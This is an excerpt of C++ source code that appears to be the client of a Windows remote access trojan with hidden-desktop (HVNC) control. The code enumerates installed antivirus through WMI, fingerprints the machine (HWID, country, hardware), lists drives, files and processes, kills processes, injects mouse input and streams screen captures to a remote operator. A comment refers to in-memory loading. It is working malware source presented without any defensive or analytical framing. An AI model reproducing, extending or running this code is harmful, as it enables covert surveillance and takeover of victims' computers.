...
HDESK hOriginalDesk = NULL, hHiddenDesk = NULL;
HANDLE hHVNCThread = NULL;
...
// --- Forward Declarations (Essential for cross-references) ---
...
string GetAntivirus() {
    ...
    if (FAILED(hres)) return av;
    IWbemServices *pSvc = NULL;
    
    BSTR bstrNamespace = SysAllocString(L"ROOT\\SecurityCenter2");
    hres = pLoc->ConnectServer(bstrNamespace, NULL, NULL, 0, 0, 0, 0, &pSvc);
    SysFreeString(bstrNamespace);

    if (FAILED(hres)) { pLoc->Release(); return av; }
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); return av; }
    
    IEnumWbemClassObject* pEnumerator = NULL;
    BSTR bstrLang = SysAllocString(L"WQL");
    BSTR bstrQuery = SysAllocString(L"SELECT * FROM AntivirusProduct");
    hres = pSvc->ExecQuery(bstrLang, bstrQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
    ...
    if (pEnumerator) {
        if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == 0) {
            VARIANT vtProp;
            pclsObj->Get(L"displayName", 0, &vtProp, 0, 0);
            av = WideToUtf8(vtProp.bstrVal);
            VariantClear(&vtProp);
            pclsObj->Release();
        }
        pEnumerator->Release();
...
void ListDrives() {
    DWORD d = GetLogicalDrives(); string j = "["; bool first = true;
    for (int i = 0; i < 26; i++) { 
        if (d & (1 << i)) { 
    ...
    j.append("]"); SendPacket(TYPE_FILE_LS_RES, j.c_str(), (int)j.length());
}

void ListDirectory(const char* pUtf8) {
    if (strlen(pUtf8) == 0 || strcmp(pUtf8, "root") == 0) { ListDrives(); return; }
    wstring pathW = Utf8ToWide(pUtf8); 
    if (pathW.length() > 0 && pathW.back() == (wchar_t)BS) pathW.pop_back();
    wstring search = pathW; search.append(L"\\*"); 
    WIN32_FIND_DATAW ffd; HANDLE hFind = FindFirstFileW(search.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE) { SendPacket(TYPE_FILE_LS_RES, "[]", 2); return; }
    string json = "["; bool first = true;
    do {
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;
        if (!first) json.append(","); first = false;
        string name = EscapeJson(WideToUtf8(ffd.cFileName)); bool isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        long long sz = ((long long)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;
        json.append("{\"name\":\""); json.append(name); json.append("\",\"is_dir\":"); json.append(isDir ? "true" : "false"); json.append(",\"size\":"); json.append(to_string(sz)); json.append("}");
    } while (FindNextFileW(hFind, &ffd) != 0);
    json.append("]"); FindClose(hFind); SendPacket(TYPE_FILE_LS_RES, json.c_str(), (int)json.length());
}
...
void ListProcesses() {
    ...
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe); if (!Process32First(hSnap, &pe)) { CloseHandle(hSnap); return; }
    string json = "["; bool first = true;
    do {
        if (!first) json.append(","); first = false;
        string name = EscapeJson(pe.szExeFile);
        json.append("{\"pid\":"); json.append(to_string((int)pe.th32ProcessID)); json.append(",\"name\":\""); json.append(name); json.append("\",\"threads\":"); json.append(to_string((int)pe.cntThreads)); json.append("}");
    } while (Process32Next(hSnap, &pe));
    json.append("]"); CloseHandle(hSnap); SendPacket(TYPE_PROC_LS_RES, json.c_str(), (int)json.length());
}

void KillProcess(int pid) { HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid); if (h) { TerminateProcess(h, 0); CloseHandle(h); } }

void SendSysInfo() {
    char pc[MAX_PATH]; DWORD sz = MAX_PATH; GetComputerNameA(pc, &sz);
    char cpu[256] = "Unknown CPU"; HKEY hKey;
    ...
    // New Data
    string hwid = GetHWID();
    string av = GetAntivirus();
    string up = GetUptime();

    string j = "{\"pc_name\":\"" + string(pc) + "\",\"os\":\"Windows 10/11\",\"cpu\":\"" + EscapeJson(cpu) + "\",\"gpu\":\"" + EscapeJson(gpu) + "\",\"ram_total\":\"" + to_string(ram) + "GB\",\"country\":\"" + string(cnt) + "\",\"hwid\":\"" + hwid + "\",\"antivirus\":\"" + EscapeJson(av) + "\",\"uptime\":\"" + up + "\"}";
    SendPacket(TYPE_SYS_INFO, j.c_str(), (int)j.length());
}
...
void HandleMouseInput(const char* d) {
    float rx, ry; int f; if (sscanf(d, "%f,%f,%d", &rx, &ry, &f) == 3) {
        if (!monitors || monitors->empty()) RefreshMonitors(); int idx = targetMonitor >= (int)monitors->size() ? 0 : targetMonitor;
        RECT r = (*monitors)[idx].rcMonitor; int sX = r.left + (int)(rx * (r.right - r.left)), sY = r.top + (int)(ry * (r.bottom - r.top));
        ...
        INPUT i = { 0 }; i.type = INPUT_MOUSE; i.mi.dx = (LONG)(((sX - vX) * 65535) / vW); i.mi.dy = (LONG)(((sY - vY) * 65535) / vH); i.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_MOVE;
        if (f & 1) i.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN; if (f & 2) i.mi.dwFlags |= MOUSEEVENTF_LEFTUP; if (f & 4) i.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN; if (f & 8) i.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
...
void CaptureAndSendScreen() {
    if (!monitors || monitors->empty()) RefreshMonitors(); int i = (targetMonitor >= (int)monitors->size()) ? 0 : targetMonitor; RECT r = (*monitors)[i].rcMonitor; int w = r.right - r.left, h = r.bottom - r.top;
    HDC hS = GetDC(NULL), hM = CreateCompatibleDC(hS); HBITMAP hB = CreateCompatibleBitmap(hS, w, h); SelectObject(hM, hB); BitBlt(hM, 0, 0, w, h, hS, r.left, r.top, SRCCOPY);
    CURSORINFO ci = { 0 }; ci.cbSize = sizeof(ci); if (GetCursorInfo(&ci) && (ci.flags == CURSOR_SHOWING)) { ICONINFO ii = { 0 }; if (GetIconInfo(ci.hCursor, &ii)) { DrawIcon(hM, ci.ptScreenPos.x - r.left - ii.xHotspot, ci.ptScreenPos.y - r.top - ii.yHotspot, ci.hCursor); if (ii.hbmMask) DeleteObject(ii.hbmMask); if (ii.hbmColor) DeleteObject(ii.hbmColor); } }
    IStream* ps = NULL; CreateStreamOnHGlobal(NULL, TRUE, &ps); 
    Bitmap* b = new Bitmap(hB, NULL);
    CLSID c; GetEncoderClsid(L"image/jpeg", &c); EncoderParameters ep; ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality; ep.Parameter[0].Type = EncoderParameterValueTypeLong; ep.Parameter[0].NumberOfValues = 1; ULONG q = (ULONG)jpegQuality; ep.Parameter[0].Value = &q; 
    b->Save(ps, &c, &ep); LARGE_INTEGER lz = { 0 }; ULARGE_INTEGER pos; ps->Seek(lz, STREAM_SEEK_END, &pos); ps->Seek(lz, STREAM_SEEK_SET, NULL); DWORD sz = (DWORD)pos.QuadPart; char* buf = (char*)malloc(sz); ULONG br; ps->Read(buf, sz, &br); SendPacket(TYPE_SCREEN_FRAME, buf, sz);
    free(buf); delete b; DeleteObject(hB); DeleteDC(hM); ReleaseDC(NULL, hS); ps->Release();
}
...
// Exported function for stable memory loading
